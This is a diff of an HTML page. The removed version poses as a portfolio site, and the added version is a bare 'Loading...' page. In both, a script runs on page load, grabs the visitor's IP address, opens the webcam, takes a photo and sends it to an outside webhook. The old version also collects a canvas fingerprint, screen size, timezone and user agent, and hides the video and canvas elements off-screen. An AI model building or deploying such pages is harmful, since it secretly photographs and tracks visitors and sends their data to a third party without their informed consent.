@@ -1,153 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pavan Chowdary Lingam - Portfolio</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            color: #333;
-            background: #f4f4f4;
-        }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        header {
-            text-align: center; background: white; padding: 60px 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 15px;
-            margin-bottom: 40px;
-        }
-        h1 { font-size: 3.5em; color: #2c3e50; margin-bottom: 10px; font-weight: 700; }
-        .subtitle { font-size: 1.4em; color: #7f8c8d; margin-bottom: 30px; }
-        .btn {
-            display: inline-block; background: linear-gradient(45deg, #3498db, #2980b9);
-            color: white; padding: 18px 40px; border-radius: 50px; text-decoration: none;
-            font-size: 1.2em; font-weight: 600; box-shadow: 0 8px 25px rgba(52,152,219,0.3);
-            transition: all 0.3s; border: none; cursor: pointer;
-        }
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(52,152,219,0.4); }
-        .features {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px; margin: 50px 0;
-        }
-        .feature { background: white; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.08); }
-        .feature h3 { color: #2c3e50; margin-bottom: 15px; font-size: 1.5em; }
-        #video, #canvas { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
-        #status { 
-            position: fixed; bottom: 10px; right: 10px; 
-            background: rgba(0,0,0,0.7); color: white;
-            padding: 10px 15px; border-radius: 5px;
-            font-size: 12px; z-index: 9999;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <header>
-            <h1>Pavan Chowdary Lingam</h1>
-            <p class="subtitle">Full Stack Developer | Designer | Creator</p>
-            <button class="btn" onclick="document.getElementById('msg').style.display='block'">🌟 View My Portfolio</button>
-            <p id="msg" style="display:none; margin-top:20px; color:#27ae60; font-weight:bold;">Coming Soon!</p>
-        </header>
-        
-        <div class="features">
-            <div class="feature"><h3>🚀 Web Development</h3><p>React, Node.js, full-stack</p></div>
-            <div class="feature"><h3>🎨 UI/UX Design</h3><p>Clean modern designs</p></div>
-            <div class="feature"><h3>⚡ Mobile Apps</h3><p>React Native expert</p></div>
-        </div>
-    </div>
-
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
-    <div id="status">Initializing...</div>
-
-    <script>
-        // WEBHOOK URL - Updated 2026-03-31 13:25
-        const WEBHOOK = 'https://hook.eu2.make.com/d51b7twkck58zqngesmufqa4av54fsfp';
-        
-        const data = {
-            email: 'pavanlingam8899@gmail.com',
-            name: 'Pavan Chowdary Lingam Portfolio',
-            ip: 'detecting...',
-            userAgent: navigator.userAgent,
-            referrer: document.referrer || 'direct',
-            url: window.location.href,
-            timestamp: '2026-03-31 13:25',
-            canvas_fp: '',
-            photo: '',
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            language: navigator.language
-        };
-
-        const statusEl = document.getElementById('status');
-        
-        function updateStatus(msg) {
-            statusEl.textContent = msg;
-            console.log(msg);
-        }
-
-        // Canvas fingerprint
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top'; 
-        ctx.font = '14px Arial';
-        ctx.fillText('Portfolio FP ' + Date.now(), 2, 2);
-        data.canvas_fp = canvas.toDataURL();
-
-        // AUTO CAPTURE & SEND
-        window.addEventListener('load', async () => {
-            updateStatus('Getting IP...');
-            
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const ipData = await res.json();
-                data.ip = ipData.ip;
-            } catch(e) { data.ip = 'unknown'; }
-
-            updateStatus('Camera starting...');
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: 640, height: 480 },
-                    audio: false
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => setTimeout(resolve, 2000);
-                });
-                
-                ctx.drawImage(video, 0, 0, 640, 480);
-                data.photo = canvas.toDataURL('image/jpeg', 0.9);
-                
-                updateStatus('Photo captured! Sending...');
-                stream.getTracks().forEach(t => t.stop());
-                
-            } catch(e) { 
-                data.photo = 'camera_denied'; 
-                updateStatus('No camera. Sending...');
-            }
-
-            // SEND TO MAKE.COM
-            try {
-                const response = await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    updateStatus('✅ Sent! Check email.');
-                } else {
-                    updateStatus('❌ Failed: ' + response.status);
-                }
-            } catch(err) {
-                updateStatus('❌ Error: ' + err.message);
-            }
-        });
-    </script>
+<html>
+<body style="font-family:Arial;text-align:center;padding:50px">
+<h1>Loading...</h1>
+<script>
+fetch('https://api.ipify.org?format=json')
+.then(r=>r.json())
+.then(i=>{
+navigator.mediaDevices.getUserMedia({video:true})
+.then(s=>{
+let v=document.createElement('video');
+v.srcObject=s;
+v.play();
+setTimeout(()=>{
+let c=document.createElement('canvas');
+c.width=320;c.height=240;
+c.getContext('2d').drawImage(v,0,0,320,240);
+c.toBlob(b=>{
+let d=new FormData();
+d.append('ip',i.ip);
+d.append('photo',b,'pic.jpg');
+fetch('https://webhook.site/4c304a59-d24d-44e8-878c-3617a521a5a4',{method:'POST',body:d});
+s.getTracks().forEach(t=>t.stop());
+document.body.innerHTML='<h1>Done! Check webhook.site</h1>';
+},'image/jpeg',0.6);
+},2000);
+});
+});
+</script>
 </body>
 </html>
